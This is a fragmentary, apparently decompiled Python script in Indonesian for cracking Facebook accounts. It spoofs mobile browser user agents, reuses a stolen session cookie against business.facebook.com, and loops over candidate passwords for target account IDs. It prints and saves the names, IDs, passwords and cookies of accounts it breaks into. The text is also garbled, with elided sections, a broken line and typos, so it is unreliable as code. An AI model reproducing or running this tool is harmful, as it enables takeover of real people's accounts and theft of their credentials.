...
ugen = ['Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36']
ugen2 = ['Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 seperti Mac OS X) AppleWebKit/602.1.50 (KHTML, seperti Gecko) Version/10,0 Mobile/19E241 Safari/602.1']
try:
...
def login_lagi334():
 ...
 P, M, H, K, B, U, O, N])
	...
	loading()
	try:
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
...
def crack(idf,pwv,nmf):
	...
	sys.stdout.flush()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
	ua2 = 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				panjihitam(nel(okegan, title='[bold red][[bold green]SILENT LIVE - OK[bold red]]'))				
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				okengab = f'[âž£] NAMA : {nmf}\n[âž£] ID FACEBOOK : {idf}\n[âž£] PASSWORD : {pw}\n[âž£] COOKIES  : {kuki}'
				okegan = nel(okengab, style='white')
				panjihitam(nel(okegan, title='[bold red][[bold green]SILTNT LIVE - OK[bold red]]'))
...
if __name__=='__main__':
	...
	try:os.system('touch .SILENT.txt')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
